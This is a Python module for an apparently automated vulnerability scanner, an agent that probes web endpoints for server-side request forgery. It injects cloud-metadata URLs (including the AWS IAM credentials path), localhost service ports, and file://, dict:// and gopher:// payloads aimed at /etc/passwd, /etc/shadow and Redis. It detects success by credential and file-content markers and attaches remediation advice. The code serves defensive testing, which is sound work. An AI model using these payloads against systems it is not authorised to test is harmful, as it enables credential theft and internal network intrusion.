"""
SSRF Agent - Detects Server-Side Request Forgery vulnerabilities.
"""
import re
import secrets
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, urlparse, quote

from .base_agent import BaseSecurityAgent, AgentResult
from models.vulnerability import Severity, VulnerabilityType


class SSRFAgent(BaseSecurityAgent):
    """
    SSRF vulnerability detection agent.
    
    Tests for:
    - Cloud metadata endpoint access (AWS, GCP, Azure)
    - Internal network scanning
    - File protocol access
    - Protocol smuggling
    """
    
    agent_name = "ssrf"
    agent_description = "Tests for Server-Side Request Forgery vulnerabilities"
    vulnerability_types = [VulnerabilityType.SSRF]
    
    # SSRF payloads for different environments
    CLOUD_METADATA_PAYLOADS = [
        # AWS IMDSv1
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata", "aws-metadata"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials", "aws-iam"),
        ("http://169.254.169.254/latest/user-data/", "AWS user data", "aws-userdata"),
        
        # AWS IMDSv2 (requires token, but test anyway)
        ("http://169.254.169.254/latest/api/token", "AWS IMDSv2 token", "aws-imdsv2"),
        
        # GCP
        ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata", "gcp-metadata"),
        ("http://169.254.169.254/computeMetadata/v1/", "GCP metadata (IP)", "gcp-metadata-ip"),
        
        # Azure
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure metadata", "azure-metadata"),
        
        # DigitalOcean
        ("http://169.254.169.254/metadata/v1/", "DigitalOcean metadata", "do-metadata"),
        
        # Alibaba Cloud
        ("http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata", "alibaba-metadata"),
    ]
    
    # Internal network payloads
    INTERNAL_PAYLOADS = [
        ("http://localhost/", "localhost", "localhost"),
        ("http://127.0.0.1/", "loopback IP", "loopback"),
        ("http://127.0.0.1:22/", "SSH service", "ssh"),
        ("http://127.0.0.1:3306/", "MySQL service", "mysql"),
        ("http://127.0.0.1:6379/", "Redis service", "redis"),
        ("http://127.0.0.1:27017/", "MongoDB service", "mongodb"),
        ("http://127.0.0.1:9200/", "Elasticsearch", "elasticsearch"),
        ("http://[::1]/", "IPv6 localhost", "ipv6-localhost"),
        ("http://0.0.0.0/", "all interfaces", "all-interfaces"),
        ("http://0/", "zero IP shorthand", "zero-ip"),
    ]
    
    # Protocol payloads
    PROTOCOL_PAYLOADS = [
        ("file:///etc/passwd", "file protocol (passwd)", "file-passwd"),
        ("file:///etc/shadow", "file protocol (shadow)", "file-shadow"),
        ("file:///c:/windows/win.ini", "file protocol (Windows)", "file-windows"),
        ("dict://127.0.0.1:6379/info", "dict protocol (Redis)", "dict-redis"),
        ("gopher://127.0.0.1:6379/_info", "gopher protocol (Redis)", "gopher-redis"),
    ]
    
    # URL parameter patterns that might be vulnerable
    URL_PARAM_PATTERNS = [
        r'url', r'uri', r'path', r'dest', r'redirect', r'target',
        r'link', r'src', r'source', r'file', r'page', r'feed',
        r'host', r'site', r'fetch', r'load', r'download', r'proxy',
        r'callback', r'return', r'next', r'continue', r'goto'
    ]
    
    async def scan(
        self,
        target_url: str,
        endpoints: List[Dict[str, Any]],
        technology_stack: List[str] = None,
        scan_context: Optional[Any] = None
    ) -> List[AgentResult]:
        """
        Scan for SSRF vulnerabilities.
        """
        results = []
        
        for endpoint in endpoints:
            url = endpoint.get("url", target_url)
            params = endpoint.get("params", {})
            method = endpoint.get("method", "GET")
            
            # Find URL-related parameters
            url_params = self._find_url_parameters(params)
            
            for param_name in url_params:
                # Test cloud metadata access (most critical)
                cloud_result = await self._test_cloud_metadata(url, method, params, param_name)
                if cloud_result:
                    results.append(cloud_result)
                    continue  # Found critical issue, skip other tests for this param
                
                # Test internal network access
                internal_result = await self._test_internal_access(url, method, params, param_name)
                if internal_result:
                    results.append(internal_result)
                    continue
                
                # Test protocol handlers
                protocol_result = await self._test_protocol_handlers(url, method, params, param_name)
                if protocol_result:
                    results.append(protocol_result)
        
        return results
    
    def _find_url_parameters(self, params: Dict[str, Any]) -> List[str]:
        """Find parameters that might accept URLs."""
        url_params = []
        
        for param_name, value in params.items():
            # Check if parameter name matches URL patterns
            for pattern in self.URL_PARAM_PATTERNS:
                if re.search(pattern, param_name, re.IGNORECASE):
                    url_params.append(param_name)
                    break
            
            # Check if value looks like a URL
            if isinstance(value, str) and (
                value.startswith(('http://', 'https://', '/')) or
                re.match(r'^[\w.-]+\.(com|org|net|io)', value)
            ):
                if param_name not in url_params:
                    url_params.append(param_name)
        
        return url_params
    
    async def _test_cloud_metadata(
        self,
        url: str,
        method: str,
        params: Dict[str, Any],
        param_name: str
    ) -> Optional[AgentResult]:
        """Test for cloud metadata endpoint access."""
        
        for payload, description, payload_type in self.CLOUD_METADATA_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                if method.upper() == "GET":
                    response = await self.make_request(url, params=test_params)
                else:
                    response = await self.make_request(url, method=method, data=test_params)
                
                if response and self._is_metadata_response(response.text, payload_type):
                    return self.create_result(
                        vulnerability_type=VulnerabilityType.SSRF,
                        is_vulnerable=True,
                        severity=Severity.CRITICAL,
                        confidence=95,
                        url=url,
                        parameter=param_name,
                        method=method,
                        title=f"SSRF: Cloud Metadata Access ({description})",
                        description=(
                            f"The '{param_name}' parameter is vulnerable to SSRF, allowing access to "
                            f"cloud instance metadata. This can expose sensitive credentials, API keys, "
                            f"and infrastructure configuration."
                        ),
                        evidence=f"Payload: {payload}\nResponse indicators: metadata content detected",
                        request_data={"param": param_name, "payload": payload},
                        response_snippet=response.text[:500],
                        likelihood=9.0,
                        impact=10.0,
                        exploitability_rationale=(
                            "Directly exploitable. Cloud metadata access can leak IAM credentials, "
                            "enabling full AWS/GCP/Azure account compromise."
                        ),
                        remediation=(
                            "1. Implement URL allowlist (only allow specific domains)\n"
                            "2. Block requests to RFC 1918 addresses and link-local (169.254.x.x)\n"
                            "3. Use IMDSv2 on AWS (requires token)\n"
                            "4. Disable instance metadata service if not needed\n"
                            "5. Use network segmentation to prevent metadata access"
                        ),
                        owasp_category="A10:2021 – Server-Side Request Forgery",
                        cwe_id="CWE-918"
                    )
                    
            except Exception as e:
                print(f"[SSRF Agent] Error testing {payload}: {e}")
        
        return None
    
    async def _test_internal_access(
        self,
        url: str,
        method: str,
        params: Dict[str, Any],
        param_name: str
    ) -> Optional[AgentResult]:
        """Test for internal network access."""
        
        for payload, description, payload_type in self.INTERNAL_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                if method.upper() == "GET":
                    response = await self.make_request(url, params=test_params)
                else:
                    response = await self.make_request(url, method=method, data=test_params)
                
                if response and self._is_internal_response(response, payload_type):
                    return self.create_result(
                        vulnerability_type=VulnerabilityType.SSRF,
                        is_vulnerable=True,
                        severity=Severity.HIGH,
                        confidence=85,
                        url=url,
                        parameter=param_name,
                        method=method,
                        title=f"SSRF: Internal Network Access ({description})",
                        description=(
                            f"The '{param_name}' parameter allows SSRF to internal network addresses. "
                            f"This can be used to scan internal services, bypass firewalls, or access "
                            f"internal-only resources."
                        ),
                        evidence=f"Payload: {payload}\nResponse status: {response.status_code}",
                        request_data={"param": param_name, "payload": payload},
                        response_snippet=response.text[:300] if response.text else "",
                        likelihood=8.0,
                        impact=8.0,
                        exploitability_rationale=(
                            "Directly exploitable. Internal network access enables service enumeration, "
                            "port scanning, and potential pivot to internal systems."
                        ),
                        remediation=(
                            "1. Implement strict URL allowlisting\n"
                            "2. Block all RFC 1918 addresses (10.x, 172.16-31.x, 192.168.x)\n"
                            "3. Block localhost and loopback addresses\n"
                            "4. Use DNS resolution allowlist\n"
                            "5. Validate URL scheme (https only)"
                        ),
                        owasp_category="A10:2021 – Server-Side Request Forgery",
                        cwe_id="CWE-918"
                    )
                    
            except Exception as e:
                pass  # Many internal tests will fail, that's expected
        
        return None
    
    async def _test_protocol_handlers(
        self,
        url: str,
        method: str,
        params: Dict[str, Any],
        param_name: str
    ) -> Optional[AgentResult]:
        """Test for dangerous protocol handler access."""
        
        for payload, description, payload_type in self.PROTOCOL_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                if method.upper() == "GET":
                    response = await self.make_request(url, params=test_params)
                else:
                    response = await self.make_request(url, method=method, data=test_params)
                
                if response and self._is_file_content(response.text, payload_type):
                    severity = Severity.CRITICAL if "passwd" in payload or "shadow" in payload else Severity.HIGH
                    
                    return self.create_result(
                        vulnerability_type=VulnerabilityType.SSRF,
                        is_vulnerable=True,
                        severity=severity,
                        confidence=90,
                        url=url,
                        parameter=param_name,
                        method=method,
                        title=f"SSRF: Protocol Handler Abuse ({description})",
                        description=(
                            f"The '{param_name}' parameter allows SSRF via {payload.split(':')[0]}:// protocol. "
                            f"This enables reading local files or interacting with internal services."
                        ),
                        evidence=f"Payload: {payload}",
                        request_data={"param": param_name, "payload": payload},
                        response_snippet=response.text[:300] if response.text else "",
                        likelihood=8.0,
                        impact=9.0,
                        exploitability_rationale=(
                            "Directly exploitable. Protocol handler abuse can read sensitive files "
                            "or interact with internal services like Redis/Memcached."
                        ),
                        remediation=(
                            "1. Allowlist only http:// and https:// protocols\n"
                            "2. Block file://, dict://, gopher://, etc.\n"
                            "3. Use URL parsing library to validate scheme\n"
                            "4. Implement proper input validation"
                        ),
                        owasp_category="A10:2021 – Server-Side Request Forgery",
                        cwe_id="CWE-918"
                    )
                    
            except Exception as e:
                pass
        
        return None
    
    def _is_metadata_response(self, response_text: str, payload_type: str) -> bool:
        """Check if response contains cloud metadata indicators."""
        indicators = {
            "aws-metadata": ["ami-id", "instance-id", "instance-type", "local-hostname"],
            "aws-iam": ["AccessKeyId", "SecretAccessKey", "Token", "Expiration"],
            "aws-userdata": ["#!/bin/bash", "cloud-init", "user-data"],
            "gcp-metadata": ["attributes", "hostname", "zone", "machine-type"],
            "azure-metadata": ["vmId", "subscriptionId", "resourceGroupName"],
            "do-metadata": ["droplet_id", "hostname", "region"],
            "alibaba-metadata": ["instance-id", "region-id"],
        }
        
        response_lower = response_text.lower()
        for indicator in indicators.get(payload_type, []):
            if indicator.lower() in response_lower:
                return True
        
        return False
    
    def _is_internal_response(self, response, payload_type: str) -> bool:
        """Check if response indicates successful internal access."""
        if not response:
            return False
        
        # Connection refused or timeout = service exists but blocked
        # Success = might be vulnerable
        
        if response.status_code == 200:
            # Check for service-specific indicators
            indicators = {
                "ssh": ["SSH", "OpenSSH"],
                "mysql": ["mysql", "MariaDB"],
                "redis": ["redis", "REDIS"],
                "mongodb": ["mongodb", "ismaster"],
                "elasticsearch": ["cluster_name", "elasticsearch"],
            }
            
            for indicator in indicators.get(payload_type, []):
                if indicator in response.text:
                    return True
            
            # Generic success - might be internal page
            if len(response.text) > 100:
                return True
        
        return False
    
    def _is_file_content(self, response_text: str, payload_type: str) -> bool:
        """Check if response contains file content indicators."""
        indicators = {
            "file-passwd": ["root:", "/bin/bash", "/bin/sh", "nobody:"],
            "file-shadow": ["root:", "$6$", "$5$", "$1$"],  # Password hashes
            "file-windows": ["[fonts]", "[extensions]", "[mci extensions]"],
        }
        
        for indicator in indicators.get(payload_type, []):
            if indicator in response_text:
                return True
        
        return False
